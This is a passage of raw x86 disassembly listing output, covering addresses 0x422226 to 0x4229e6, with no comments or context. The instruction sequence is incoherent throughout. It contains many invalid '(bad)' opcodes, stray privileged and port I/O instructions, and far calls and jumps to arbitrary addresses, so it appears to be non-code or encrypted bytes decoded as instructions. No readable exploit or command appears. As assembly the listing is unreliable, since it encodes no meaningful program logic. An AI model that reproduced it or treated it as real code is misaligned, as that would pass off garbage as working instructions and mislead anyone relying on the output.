  422226:	mov    BYTE PTR [ecx+ecx*1-0x4a10f8b9],cl
  42222d:	adc    edi,ebx
  42222f:	cmp    DWORD PTR [esi],edx
  422231:	pop    es
  422232:	clc    
  422233:	into   
  422234:	sub    cl,BYTE PTR [edx]
  422236:	or     al,0x7c
  422238:	jp     0x422204
  42223a:	push   0x7e
  42223c:	into   
  42223d:	aad    0x12
  42223f:	add    edi,DWORD PTR [edx-0x5d]
  422242:	and    eax,DWORD PTR [esi-0x5f47bdf7]
  422248:	add    BYTE PTR [edx-0x4c3b1075],bh
  42224e:	inc    esp
  42224f:	pop    ecx
  422250:	jmp    0x422278
  422252:	and    al,0xcd
  422254:	jmp    0x4222d1
  422256:	xchg   DWORD PTR [edi],ecx
  422258:	out    0xd5,eax
  42225a:	sub    BYTE PTR [ecx-0x1925da05],0xf0
  422261:	clc    
  422262:	and    al,0xd7
  422264:	pop    dx
  422266:	cld    
  422267:	jmp    0xc132fb2
  42226c:	mov    ebp,edi
  42226e:	mov    dh,0xe5
  422270:	jne    0x422245
  422272:	sub    esi,DWORD PTR [ebp+0x40]
  422275:	mov    esp,0x42496110
  42227a:	adc    DWORD PTR [edi],0x63dfdb3c
  422280:	xor    eax,0x1b6da0f9
  422285:	push   0xffffffae
  422287:	repz push ebp
  422289:	jne    0x4222d2
  42228b:	daa    
  42228c:	or     esp,DWORD PTR [ebx]
  42228e:	xchg   ecx,eax
  42228f:	aam    0xb1
  422291:	xchg   DWORD PTR [edx+0xd40a701],edx
  422297:	xchg   edx,eax
  422298:	lods   eax,DWORD PTR ds:[esi]
  422299:	pop    ebp
  42229a:	rcl    ecx,1
  42229c:	mov    dl,0xe1
  42229e:	ret    
  42229f:	call   0xebd2:0xa474c314
  4222a6:	mov    dl,0x6a
  4222a8:	mov    al,0x10
  4222aa:	retf   0xa5bd
  4222ad:	outs   dx,BYTE PTR ds:[esi]
  4222ae:	add    al,0xd0
  4222b0:	(bad)  
  4222b1:	jge    0x422255
  4222b3:	dec    edi
  4222b4:	test   al,0xb7
  4222b6:	jne    0x422322
  4222b8:	mov    WORD PTR [eax+0x34],?
  4222bb:	lock call 0x5470:0xbb6d9853
  4222c3:	inc    esi
  4222c4:	and    al,0xff
  4222c6:	jl     0x4222b2
  4222c8:	cli    
  4222c9:	or     ebx,DWORD PTR [esp+eax*1+0x20]
  4222cd:	rcr    BYTE PTR [eax],cl
  4222cf:	aas    
  4222d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222d1:	dec    ebx
  4222d2:	sub    ah,BYTE PTR [ebx-0x4e]
  4222d5:	xor    DWORD PTR [edi+0x79b551d0],ecx
  4222db:	dec    edi
  4222dc:	add    eax,DWORD PTR [edi+edi*1-0x24]
  4222e0:	push   eax
  4222e1:	inc    edx
  4222e2:	dec    eax
  4222e3:	push   edx
  4222e4:	pop    edx
  4222e5:	jg     0x42232f
  4222e7:	mov    ds:0x6a4836c5,al
  4222ec:	xchg   ebx,eax
  4222ed:	popf   
  4222ee:	ficomp WORD PTR [eax+edi*8-0xf638177]
  4222f5:	push   esi
  4222f6:	ins    BYTE PTR es:[edi],dx
  4222f7:	push   0x7d
  4222f9:	sub    eax,0x7d4ea728
  4222fe:	das    
  4222ff:	call   0x2f42c68a
  422304:	aaa    
  422305:	pop    eax
  422306:	pop    ecx
  422307:	mov    al,ds:0xb1dc41bf
  42230c:	mov    bh,0x93
  42230e:	mov    dh,0x92
  422310:	sar    BYTE PTR [edx+eax*8-0x5a],cl
  422314:	outs   dx,DWORD PTR ds:[esi]
  422315:	cmp    al,0x2f
  422317:	lods   al,BYTE PTR ds:[esi]
  422318:	cmc    
  422319:	pop    DWORD PTR [edi]
  42231b:	ret    0x5898
  42231e:	lods   al,BYTE PTR ds:[esi]
  42231f:	repz mov al,ds:0xac8166e9
  422325:	lock (bad) 
  422327:	mov    al,0xa
  422329:	int    0x2e
  42232b:	popf   
  42232c:	test   al,0x5e
  42232e:	mov    cs:0xc0253115,al
  422334:	call   DWORD PTR [edi-0x4d]
  422337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422338:	fcomp  QWORD PTR [eax]
  42233a:	(bad)  
  42233b:	in     eax,0xc1
  42233d:	xlat   BYTE PTR ds:[ebx]
  42233e:	mov    al,ds:0x670fa4e9
  422343:	(bad)  
  422345:	adc    eax,0xdce28a6a
  42234a:	fld    DWORD PTR [ebp+eiz*2+0x3a]
  42234e:	mov    eax,0x4e577a63
  422353:	fild   QWORD PTR [eax+0x6]
  422356:	(bad)  
  422357:	xor    BYTE PTR [eax],bl
  422359:	enter  0xf9be,0xb1
  42235d:	jp     0x4223ca
  42235f:	rcr    esp,cl
  422361:	cs pop ebp
  422363:	add    esi,ecx
  422365:	stc    
  422366:	sbb    ch,BYTE PTR [ebx-0xd72fef4]
  42236c:	xchg   edx,eax
  42236d:	pop    esp
  42236e:	out    0xb2,al
  422370:	push   0xffffffa8
  422372:	repz clc 
  422374:	repnz sbb DWORD PTR gs:[eax-0x12],eax
  422379:	xchg   esp,eax
  42237a:	int    0x6a
  42237c:	ret    
  42237d:	into   
  42237e:	mov    ds:0xaa5ebed3,al
  422383:	rep stos DWORD PTR es:[edi],eax
  422385:	xor    eax,0xd26a2088
  42238a:	adc    eax,0x8e4522d0
  42238f:	retf   0xbff1
  422392:	call   ebx
  422394:	adc    ch,BYTE PTR [eax-0x2d]
  422397:	sub    al,0xb7
  422399:	mov    esp,0x55183adc
  42239e:	loopne 0x42233f
  4223a0:	cmp    eax,0x2690181c
  4223a5:	xor    DWORD PTR [edx-0x253e24d2],esi
  4223ab:	inc    edx
  4223ac:	pop    ds
  4223ad:	xchg   esi,esi
  4223af:	adc    BYTE PTR [esi+0x46be7786],dl
  4223b5:	cmp    BYTE PTR [edi+0x4b368378],ah
  4223bb:	adc    cl,BYTE PTR [eax]
  4223bd:	stos   DWORD PTR es:[edi],eax
  4223be:	mov    dl,0x30
  4223c0:	pop    ebp
  4223c1:	fnstenv [edx-0x33]
  4223c4:	sbb    BYTE PTR [ecx],bl
  4223c6:	leave  
  4223c7:	mov    al,0xb8
  4223c9:	ss aad 0xf8
  4223cc:	mov    DWORD PTR [ebx-0x63],edi
  4223cf:	xchg   edi,eax
  4223d0:	fstp   QWORD PTR [esi]
  4223d2:	inc    esp
  4223d3:	pop    edx
  4223d4:	enter  0x2db0,0x23
  4223d8:	xchg   ebx,ecx
  4223da:	sbb    al,0x7f
  4223dc:	pop    ds
  4223dd:	in     al,0xf3
  4223df:	imul   ebp,DWORD PTR [esi-0x70],0x61
  4223e3:	int    0x42
  4223e5:	dec    esi
  4223e6:	or     dh,BYTE PTR gs:[esi-0x71]
  4223ea:	shl    BYTE PTR es:[esi],0x13
  4223ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223ef:	ja     0x422459
  4223f1:	pop    ebx
  4223f2:	inc    eax
  4223f3:	or     BYTE PTR [esi+0x4386a5b9],al
  4223f9:	je     0x42243d
  4223fb:	cmp    ah,BYTE PTR [esi]
  4223fd:	mov    cl,BYTE PTR [edx]
  4223ff:	push   eax
  422400:	cmc    
  422401:	pop    eax
  422402:	dec    DWORD PTR [esi]
  422404:	mov    edi,0x8d0a41bc
  422409:	cmc    
  42240a:	pop    edi
  42240b:	and    al,0x5f
  42240d:	mov    ch,0xcc
  42240f:	mov    bl,0x19
  422411:	and    eax,0xf7f42584
  422416:	test   eax,0x7702bbb7
  42241b:	bswap  esp
  42241d:	inc    edi
  42241e:	pop    ebx
  42241f:	iret   
  422420:	pop    ebp
  422422:	es call 0xdbb8:0x140763b0
  42242a:	popa   
  42242b:	dec    edi
  42242c:	jle    0x4223c2
  42242e:	test   al,0x86
  422430:	push   esp
  422431:	jne    0x4223be
  422433:	mov    bh,0xce
  422435:	out    dx,al
  422436:	sahf   
  422437:	push   ecx
  422438:	(bad)  
  422439:	cld    
  42243a:	mov    esp,?
  42243c:	mov    dh,0x64
  42243e:	adc    ch,bl
  422440:	por    mm4,QWORD PTR [ebx-0x74be7703]
  422447:	and    ebx,DWORD PTR [ebx+0x4e]
  42244a:	sub    DWORD PTR [ecx+0x23],esp
  42244d:	fwait
  42244e:	(bad)  
  42244f:	sahf   
  422450:	adc    eax,0xd4d7bdac
  422455:	pop    ebp
  422456:	test   eax,0x6a166fb3
  42245b:	sub    DWORD PTR [edi-0x6a],ecx
  42245e:	mov    al,0x2e
  422460:	je     0x42249a
  422462:	mov    bl,0x5d
  422464:	cli    
  422465:	pop    es
  422466:	test   DWORD PTR [esi+0x768799b3],0x329cca3b
  422470:	test   BYTE PTR [edx+ebp*1-0x12b5f8a0],bl
  422477:	jmp    0x85a89a57
  42247c:	jb     0x422430
  42247e:	fldcw  WORD PTR [esi+0x39d531e]
  422484:	mov    dl,bl
  422486:	inc    ebp
  422487:	repnz pop esi
  422489:	or     esi,ecx
  42248b:	jl     0x4224c3
  42248d:	clc    
  42248e:	sub    eax,0x6e8febea
  422493:	inc    edi
  422494:	or     ch,BYTE PTR [edx]
  422496:	push   0x27d2b44b
  42249b:	daa    
  42249c:	pop    edi
  42249d:	push   ds
  42249e:	outs   dx,BYTE PTR ds:[esi]
  42249f:	in     al,dx
  4224a0:	cmc    
  4224a1:	dec    esp
  4224a2:	cmp    ebx,0xffffffae
  4224a5:	fmul   DWORD PTR [esi]
  4224a7:	xchg   esi,eax
  4224a8:	pop    ecx
  4224a9:	jl     0x422451
  4224ab:	js     0x422467
  4224ad:	sub    al,0xd3
  4224af:	and    DWORD PTR [eax],ecx
  4224b1:	mov    edx,0x8aeed3f0
  4224b6:	mov    esi,0x24cdda2a
  4224bb:	mov    dl,0x46
  4224bd:	into   
  4224be:	jmp    0x494bf171
  4224c3:	jecxz  0x422461
  4224c5:	jnp    0x422533
  4224c7:	cwde   
  4224c8:	unpcklps xmm1,xmm7
  4224cb:	nop
  4224cc:	scas   al,BYTE PTR es:[edi]
  4224cd:	jmp    0x42251d
  4224cf:	and    BYTE PTR [edi-0x59],dl
  4224d2:	xchg   edx,eax
  4224d3:	iret   
  4224d4:	mov    BYTE PTR [eax+0x62907414],al
  4224da:	in     al,0x3
  4224dc:	and    al,0x58
  4224de:	fwait
  4224df:	addr16 push edx
  4224e1:	repz jmp 0x4224fd
  4224e4:	pop    ebp
  4224e5:	push   0x4f
  4224e7:	ins    DWORD PTR es:[edi],dx
  4224e8:	sti    
  4224e9:	mov    ebx,ebp
  4224eb:	das    
  4224ec:	sub    BYTE PTR [eax+edi*1],bh
  4224ef:	cdq    
  4224f0:	aam    0x99
  4224f2:	adc    cl,BYTE PTR [edx+ebx*8]
  4224f5:	push   ds
  4224f6:	mov    ecx,0xb11963e1
  4224fb:	dec    ebp
  4224fc:	les    esp,FWORD PTR [eax]
  4224fe:	lds    edi,FWORD PTR [esi-0x7e909d58]
  422504:	sahf   
  422505:	xor    al,0xba
  422507:	in     al,0x3
  422509:	sahf   
  42250a:	dec    edx
  42250b:	call   0xc43c:0xaa43bc01
  422512:	icebp  
  422513:	jmp    0x8eb91e40
  422518:	add    eax,0x4d9275ab
  42251d:	xor    DWORD PTR [edx+edx*8+0x3e],esp
  422521:	dec    esp
  422522:	sar    BYTE PTR [edi+0x76],1
  422525:	cs int3 
  422527:	cmp    ah,0x90
  42252a:	sbb    eax,0xe34e845b
  42252f:	or     DWORD PTR [esi+0x6e],esi
  422532:	xor    al,0x24
  422534:	mov    ch,0x95
  422536:	out    dx,eax
  422537:	(bad)  
  422538:	out    dx,al
  422539:	clc    
  42253a:	test   al,0x42
  42253c:	dec    ecx
  42253d:	add    DWORD PTR [ebx+0x26],edx
  422540:	loopne 0x42256d
  422542:	in     eax,dx
  422543:	jecxz  0x4225b6
  422545:	cs dec ecx
  422547:	mov    eax,ds:0xbaf4c08f
  42254c:	loopne 0x42251f
  42254e:	pop    esi
  42254f:	ror    DWORD PTR [edi-0x59],1
  422552:	push   edx
  422553:	lods   eax,DWORD PTR ds:[esi]
  422554:	xchg   edi,eax
  422555:	pop    esp
  422556:	sahf   
  422557:	pop    edx
  422558:	into   
  422559:	js     0x4225af
  42255b:	push   ebx
  42255c:	mov    bl,0xd2
  42255e:	inc    esi
  42255f:	popa   
  422560:	outs   dx,BYTE PTR ds:[esi]
  422561:	mov    ebx,0xd83a453
  422566:	mov    cl,BYTE PTR [esp+ecx*2-0x2b5985f1]
  42256d:	leave  
  42256e:	adc    DWORD PTR [edx+0x4036da4e],eax
  422574:	test   al,0xb8
  422576:	sbb    eax,0x1e37f18e
  42257b:	jmp    0x5f2b2ba3
  422580:	call   0xb329d8c8
  422585:	add    ebp,DWORD PTR [ebp+0x4747e677]
  42258b:	nop
  42258c:	adc    BYTE PTR [eax-0x2b861b1b],cl
  422592:	aas    
  422593:	int    0xed
  422595:	in     eax,0x48
  422597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422598:	lds    edi,FWORD PTR [ebp-0x23779d85]
  42259e:	(bad)  
  42259f:	pop    esp
  4225a0:	repnz imul eax,DWORD PTR [esi+0x4d03f87f],0x87f669f6
  4225ab:	lahf   
  4225ac:	mov    al,ds:0xd3ae75a6
  4225b1:	fild   QWORD PTR [esi-0x18]
  4225b4:	adc    eax,0xfbd973db
  4225b9:	lods   eax,DWORD PTR ds:[esi]
  4225ba:	neg    DWORD PTR [esi+esi*2+0x6f]
  4225be:	sub    eax,0x354f269a
  4225c3:	imul   ebx,DWORD PTR [ebx-0x14],0xffffffee
  4225c7:	cmc    
  4225c8:	into   
  4225c9:	in     al,0x84
  4225cb:	mov    al,0x64
  4225cd:	add    DWORD PTR [ebx+0x57256ca1],ebp
  4225d3:	push   eax
  4225d4:	shl    BYTE PTR [ecx-0x47a30b04],cl
  4225da:	sahf   
  4225db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225dc:	jmp    0xc3f74b1c
  4225e1:	inc    DWORD PTR [ecx+0x28bfc2c9]
  4225e7:	mov    ebx,0xb962b53d
  4225ec:	and    ecx,0x9a6c73ef
  4225f2:	mov    esi,0x6a1d0c92
  4225f7:	jmp    0x42260e
  4225f9:	and    cl,BYTE PTR [ebx-0x21]
  4225fc:	scas   eax,DWORD PTR es:[edi]
  4225fd:	enter  0x1341,0xb0
  422601:	loop   0x42266f
  422603:	pop    es
  422604:	pushf  
  422605:	xchg   BYTE PTR [edx+0x1e],bl
  422608:	lock mov ah,0x59
  42260b:	stos   DWORD PTR es:[edi],eax
  42260c:	mov    edx,0x58128a56
  422611:	(bad)  
  422612:	push   esi
  422613:	xor    BYTE PTR [edi+0x31],0x1e
  422617:	pop    esp
  422618:	je     0x42259e
  42261a:	out    dx,al
  42261b:	in     eax,0x9f
  42261d:	xchg   BYTE PTR [esi],bh
  42261f:	out    dx,eax
  422620:	lods   al,BYTE PTR ds:[esi]
  422621:	inc    esi
  422622:	aam    0xda
  422624:	push   es
  422625:	ds ja  0x42265a
  422628:	sub    eax,0xb97ed020
  42262d:	sbb    al,0x1c
  42262f:	lods   eax,DWORD PTR ds:[esi]
  422630:	and    eax,0xcfd93a85
  422635:	xlat   BYTE PTR ds:[ebx]
  422636:	adc    esi,DWORD PTR [edi+0x2bef1880]
  42263c:	cmp    eax,0x517f6403
  422641:	call   0x113054ca
  422646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422647:	adc    bh,BYTE PTR [edi]
  422649:	cmp    BYTE PTR [ecx],cl
  42264b:	scas   eax,DWORD PTR es:[edi]
  42264c:	ret    0xa271
  42264f:	cdq    
  422650:	das    
  422651:	xchg   ecx,eax
  422652:	bound  esp,QWORD PTR [eax-0x1fe0a80a]
  422658:	in     al,0xbb
  42265a:	xchg   DWORD PTR [ebp+0x18],ebp
  42265d:	dec    ebx
  42265e:	loop   0x4226b8
  422660:	jg     0x42260f
  422662:	enter  0xd1d9,0xe
  422666:	push   edx
  422667:	mov    al,ds:0xc81747a8
  42266c:	adc    esp,ebp
  42266e:	jno    0x4226a7
  422670:	push   esp
  422671:	sbb    bl,ch
  422673:	xlat   BYTE PTR ds:[ebx]
  422674:	xchg   dl,bl
  422676:	les    eax,FWORD PTR [edi+0xd]
  422679:	mov    ds:0x317895ab,al
  42267e:	xchg   DWORD PTR [eax-0x57b14f8f],edx
  422684:	je     0x422666
  422686:	aas    
  422687:	push   0x5f
  422689:	test   eax,0xa62022d1
  42268e:	sbb    DWORD PTR [esi-0x42],0xf645aa9e
  422695:	inc    esp
  422696:	pusha  
  422697:	call   0xd003:0x8b68bebc
  42269e:	jb     0x42264f
  4226a0:	push   DWORD PTR [esi-0xa]
  4226a3:	jne    0x4226f7
  4226a5:	adc    ecx,esi
  4226a7:	(bad)  
  4226a8:	dec    esp
  4226a9:	jg     0x42265d
  4226ab:	leave  
  4226ac:	sbb    ebx,ebp
  4226ae:	inc    ebp
  4226af:	or     eax,0xeb41b69c
  4226b4:	in     eax,dx
  4226b5:	mov    edx,0x6d7022ae
  4226ba:	mov    bl,0x32
  4226bc:	mov    esi,0xa609c35c
  4226c1:	jne    0x422724
  4226c3:	clc    
  4226c4:	mov    esi,0xddabf8ad
  4226c9:	xchg   DWORD PTR [eax],edi
  4226cb:	in     al,dx
  4226cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226cd:	fst    st(1)
  4226cf:	sub    bl,BYTE PTR [eax-0x22]
  4226d2:	xor    ebx,esp
  4226d4:	icebp  
  4226d5:	repnz in al,dx
  4226d7:	shl    DWORD PTR [eax+0x7c2b11e9],0x13
  4226de:	mov    bl,0x67
  4226e0:	mov    cl,0x9a
  4226e2:	mov    dh,0x6a
  4226e4:	in     al,dx
  4226e5:	fstp   st(5)
  4226e7:	push   edx
  4226e8:	push   edi
  4226e9:	arpl   WORD PTR [edi-0x9275cec],cx
  4226ef:	jnp    0x4226a4
  4226f1:	adc    cl,BYTE PTR [ebp-0x4e5d8745]
  4226f7:	push   es
  4226f8:	and    al,0x5e
  4226fa:	add    DWORD PTR [edi+0x2e],esi
  4226fd:	lds    ebx,FWORD PTR [esi]
  4226ff:	cli    
  422700:	adc    BYTE PTR [ecx+0x3c],bh
  422703:	cli    
  422704:	mul    DWORD PTR [ebp+0x77ac450a]
  42270a:	das    
  42270b:	push   0xffffffa7
  42270d:	pop    esi
  42270e:	sub    DWORD PTR [ebp+0xf705918],eax
  422714:	loopne 0x4226fb
  422716:	lahf   
  422717:	add    ecx,esp
  422719:	les    ecx,FWORD PTR [ebp+ebp*8-0x6f]
  42271d:	hlt    
  42271e:	pop    eax
  42271f:	pop    ebx
  422720:	sbb    DWORD PTR [edi-0x17],ebx
  422723:	add    ebx,DWORD PTR [ecx]
  422725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422726:	in     al,dx
  422727:	or     BYTE PTR [ebp+0x58],ah
  42272a:	pushf  
  42272b:	jge    0x4227a9
  42272d:	xchg   edi,eax
  42272e:	mov    ch,BYTE PTR [ecx]
  422730:	fldenv [edi]
  422732:	jge    0x4226d4
  422734:	push   edx
  422735:	pop    ebp
  422736:	pop    ebp
  422737:	(bad)  
  422739:	inc    edi
  42273a:	inc    ebp
  42273b:	pop    ebp
  42273c:	pop    esi
  42273d:	das    
  42273e:	cmp    edi,0x64
  422741:	cdq    
  422742:	cdq    
  422743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422744:	mov    esp,0x14ea8d8
  422749:	sbb    ah,BYTE PTR [eax+0x26a0e36e]
  42274f:	aad    0x20
  422751:	fist   DWORD PTR [edi+0x66]
  422754:	sbb    DWORD PTR [edi+0x22e0be58],edx
  42275a:	xchg   esi,eax
  42275b:	dec    eax
  42275c:	push   edx
  42275d:	es jl  0x4227d6
  422760:	sbb    al,0x63
  422762:	xchg   esp,eax
  422763:	and    cl,ah
  422765:	add    DWORD PTR [ebx+0x3fe2feeb],edx
  42276b:	ins    BYTE PTR es:[edi],dx
  42276c:	pop    es
  42276d:	ins    BYTE PTR es:[edi],dx
  42276e:	repnz lods al,BYTE PTR ds:[esi]
  422770:	fsubr  QWORD PTR [ecx]
  422772:	xchg   esi,eax
  422773:	out    dx,eax
  422774:	ret    0x8059
  422777:	pop    ebx
  422778:	xor    ah,BYTE PTR [edx+0x3e02dbd]
  42277e:	push   es
  42277f:	shl    DWORD PTR [ebx-0x5],0x32
  422783:	into   
  422784:	rcr    edi,cl
  422786:	push   edi
  422787:	cli    
  422788:	xor    BYTE PTR [edx],bh
  42278a:	and    eax,0xfb3451f3
  42278f:	mov    edi,esi
  422791:	xchg   BYTE PTR [ebx],al
  422793:	pop    esp
  422794:	fwait
  422795:	pop    ds
  422796:	mov    edx,DWORD PTR [esi-0x26b021f5]
  42279c:	icebp  
  42279d:	rcl    BYTE PTR [ebp+0x74],0x75
  4227a1:	arpl   di,sp
  4227a3:	int3   
  4227a4:	ss mov ss,esi
  4227a7:	dec    esi
  4227a8:	mov    al,0x55
  4227aa:	xchg   DWORD PTR [ecx-0x6e],eax
  4227ad:	jg     0x422740
  4227af:	or     BYTE PTR [eax+0x5f914a8f],bl
  4227b5:	out    0xff,al
  4227b7:	pop    ss
  4227b8:	je     0x4227e1
  4227ba:	enter  0x1d13,0x23
  4227be:	inc    ebx
  4227bf:	adc    DWORD PTR [ebp-0x2d],edi
  4227c2:	inc    ebp
  4227c3:	mov    ebp,DWORD PTR ds:0x9e7d5776
  4227c9:	cmp    BYTE PTR [ebx*2-0x6439f537],cl
  4227d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227d1:	(bad)  
  4227d2:	(bad)  
  4227d3:	push   ss
  4227d4:	hlt    
  4227d5:	bound  esp,QWORD PTR [eax]
  4227d7:	push   esp
  4227d8:	test   eax,0xcad3c8e
  4227dd:	loopne 0x422855
  4227df:	sbb    DWORD PTR [esi],eax
  4227e1:	js     0x4227d1
  4227e3:	test   al,0xaf
  4227e5:	dec    ebx
  4227e6:	fdiv   QWORD PTR [ebx+0x28da78bd]
  4227ec:	jl     0x422868
  4227ee:	add    ecx,eax
  4227f0:	mov    ecx,0x5ee34b1
  4227f5:	retf   
  4227f6:	sbb    dh,bh
  4227f8:	pop    edx
  4227f9:	je     0x42283a
  4227fb:	xor    ebp,DWORD PTR [ebx]
  4227fd:	mov    eax,fs
  4227ff:	and    esp,DWORD PTR [edi-0x445b61a9]
  422805:	add    al,0xe7
  422807:	and    cl,bl
  422809:	daa    
  42280a:	add    ch,BYTE PTR [ebx-0x348e5479]
  422810:	rcr    DWORD PTR [ecx+0xc],0xa8
  422814:	scas   eax,DWORD PTR es:[edi]
  422815:	in     al,0xae
  422817:	and    dl,BYTE PTR [eax+0x433ee8eb]
  42281d:	int    0xda
  42281f:	pop    ecx
  422820:	jp     0x422868
  422822:	push   ebp
  422823:	and    DWORD PTR [ebp-0x6e],ebx
  422826:	addr16 jne 0x422866
  422829:	ret    
  42282a:	fdivr  st,st(4)
  42282c:	inc    eax
  42282d:	xor    BYTE PTR [edi+0x32],ch
  422830:	xor    al,0xe7
  422832:	ret    0xecec
  422835:	xor    al,dl
  422837:	stos   BYTE PTR es:[edi],al
  422838:	jb     0x42289c
  42283a:	jecxz  0x4227be
  42283c:	std    
  42283d:	xchg   BYTE PTR fs:[esi],dh
  422840:	ins    DWORD PTR es:[edi],dx
  422841:	in     al,0x13
  422843:	xor    DWORD PTR cs:[ebx+0x40],0xf2b58f2d
  42284b:	fwait
  42284c:	icebp  
  42284d:	inc    edx
  42284e:	jne    0x4227fd
  422850:	xor    al,0xad
  422852:	mov    ebx,0x8649ddf0
  422857:	out    0x48,al
  422859:	xchg   esi,eax
  42285a:	jmp    0x460a:0x5b4cda08
  422861:	push   esi
  422862:	pop    edi
  422863:	pushf  
  422864:	cmc    
  422865:	das    
  422866:	cmp    BYTE PTR [esi+0x357d3ab7],ah
  42286c:	pusha  
  42286d:	out    0x9c,eax
  42286f:	packsswb mm1,QWORD PTR ds:0x45251ae6
  422876:	mov    dl,0x84
  422878:	and    eax,0x5e41a76b
  42287d:	(bad)  
  42287e:	vmptrld QWORD PTR [edi]
  422881:	call   FWORD PTR [edx+esi*4-0x3e0f8deb]
  422888:	jb     0x42283d
  42288a:	test   BYTE PTR [ebp+0x4b],dl
  42288d:	sub    eax,0xe3b135e0
  422892:	clc    
  422893:	hlt    
  422894:	test   al,0x50
  422896:	mov    WORD PTR [edi+0x41],cs
  422899:	inc    edi
  42289a:	lahf   
  42289b:	loop   0x422895
  42289d:	retf   
  42289e:	sar    DWORD PTR [esp+eax*4-0x59],1
  4228a2:	ins    BYTE PTR es:[edi],dx
  4228a3:	retf   
  4228a4:	pop    ecx
  4228a5:	xor    eax,0x8a4174de
  4228aa:	xor    bh,ah
  4228ac:	mov    ds:0x73e53c9b,eax
  4228b1:	outs   dx,BYTE PTR ds:[esi]
  4228b2:	cdq    
  4228b3:	fadd   QWORD PTR [ebx]
  4228b5:	xlat   BYTE PTR ds:[ebx]
  4228b6:	(bad)  
  4228b7:	xlat   BYTE PTR ds:[ebx]
  4228b8:	pop    esi
  4228b9:	or     DWORD PTR [edx+0x5f],edi
  4228bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228bd:	rol    BYTE PTR [edx-0x66],1
  4228c0:	mov    al,ds:0x86b49944
  4228c5:	jns    0x4228cb
  4228c7:	xchg   edx,eax
  4228c8:	aaa    
  4228c9:	cmc    
  4228ca:	es repz push 0xffffffc4
  4228ce:	ss std 
  4228d0:	cwde   
  4228d1:	cmp    DWORD PTR [ebx-0x65],esp
  4228d4:	enter  0x454f,0x3f
  4228d8:	mov    esp,0xba921024
  4228dd:	or     al,0x27
  4228df:	jp     0x422863
  4228e1:	icebp  
  4228e2:	sub    eax,0xaca800cd
  4228e7:	pop    edx
  4228e8:	adc    al,0xf2
  4228ea:	sbb    ebp,DWORD PTR [ebx]
  4228ec:	push   edi
  4228ed:	xor    esi,eax
  4228ef:	dec    eax
  4228f0:	sbb    DWORD PTR [ebx+0x40],esi
  4228f3:	scas   al,BYTE PTR es:[edi]
  4228f4:	mov    eax,0xcd5999bb
  4228f9:	jge    0x42289d
  4228fb:	cmc    
  4228fc:	cdq    
  4228fd:	mov    al,ds:0xa7ea9fcb
  422902:	into   
  422903:	sub    DWORD PTR [esi+0x28],edx
  422906:	fsubr  DWORD PTR [bp+si-0x44]
  42290a:	or     eax,0x2a97a948
  42290f:	lock jle 0x4228e4
  422912:	jp     0x4228a5
  422914:	in     eax,dx
  422915:	fadd   DWORD PTR ds:0x248aa021
  42291b:	aaa    
  42291c:	xchg   esp,eax
  42291d:	mov    al,0x3
  42291f:	adc    eax,0x6d06d803
  422924:	pop    edx
  422925:	ss enter 0x6507,0x84
  42292a:	pop    eax
  42292b:	fidiv  DWORD PTR [eax+0x333596df]
  422931:	hlt    
  422932:	popf   
  422933:	(bad)  [ebx-0x78]
  422936:	bound  edx,QWORD PTR [ecx]
  422938:	lea    edi,[eax+0x0]
  42293b:	leave  
  42293c:	push   edi
  42293d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42293e:	(bad)  
  42293f:	or     DWORD PTR [ebp+0x28],edx
  422942:	pop    ebx
  422943:	(bad)  
  422944:	es cs aam 0x8d
  422948:	mov    ah,0x1c
  42294a:	fwait
  42294b:	es ds cld 
  42294e:	shl    DWORD PTR [esi],0xe0
  422951:	sub    ch,0xe0
  422954:	pop    edi
  422955:	xor    BYTE PTR [ebx-0x4a],bh
  422958:	dec    ecx
  422959:	or     BYTE PTR [ebx+0x5],ch
  42295c:	fstp   QWORD PTR ds:0x54143324
  422962:	inc    edi
  422963:	mov    bh,0xd1
  422965:	or     cl,BYTE PTR [ebx]
  422967:	mov    ds,WORD PTR [edi+0x5e]
  42296a:	mov    WORD PTR [edi],gs
  42296c:	hlt    
  42296d:	xor    eax,ebp
  42296f:	neg    BYTE PTR [edi-0x1134d575]
  422975:	xor    dl,dl
  422977:	cli    
  422978:	mov    bh,0xc3
  42297a:	adc    dh,BYTE PTR [edx]
  42297c:	xchg   ecx,eax
  42297d:	rcl    dh,cl
  42297f:	and    BYTE PTR fs:[ecx+0xd],bl
  422983:	(bad)  
  422985:	add    DWORD PTR [esi+0x2e],ebp
  422988:	mov    bh,0x75
  42298a:	hlt    
  42298b:	jnp    0x422920
  42298d:	adc    DWORD PTR [esi-0x20b626ec],0x26
  422994:	repnz cwde 
  422996:	ret    
  422997:	gs jbe 0x4229e1
  42299a:	and    eax,0x5307e98a
  42299f:	fld    DWORD PTR [edx-0x57]
  4229a2:	push   ecx
  4229a3:	cli    
  4229a4:	cmp    dl,ah
  4229a6:	(bad)  [ebx-0x3]
  4229a9:	inc    ecx
  4229aa:	int    0x89
  4229ac:	dec    eax
  4229ad:	ret    
  4229ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229af:	xor    DWORD PTR [ecx-0x24],edi
  4229b2:	out    0x9e,eax
  4229b4:	mov    ecx,0x3e310a8b
  4229b9:	inc    ebx
  4229ba:	mov    esp,0x67d8992
  4229bf:	pop    esi
  4229c0:	dec    eax
  4229c1:	jmp    0x422a0b
  4229c3:	cdq    
  4229c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229c5:	rol    DWORD PTR [ecx-0x28],0xdb
  4229c9:	test   DWORD PTR [esi],edi
  4229cb:	shl    ch,1
  4229cd:	call   0x65a48816
  4229d2:	inc    edi
  4229d3:	xchg   esi,eax
  4229d4:	shl    edx,1
  4229d6:	enter  0xe4cd,0x53
  4229da:	and    eax,0xd015c13c
  4229df:	aaa    
  4229e0:	mov    dl,0x56
  4229e2:	out    dx,al
  4229e3:	ret    0xc7b
  4229e6:	ds retf 0x6b4a
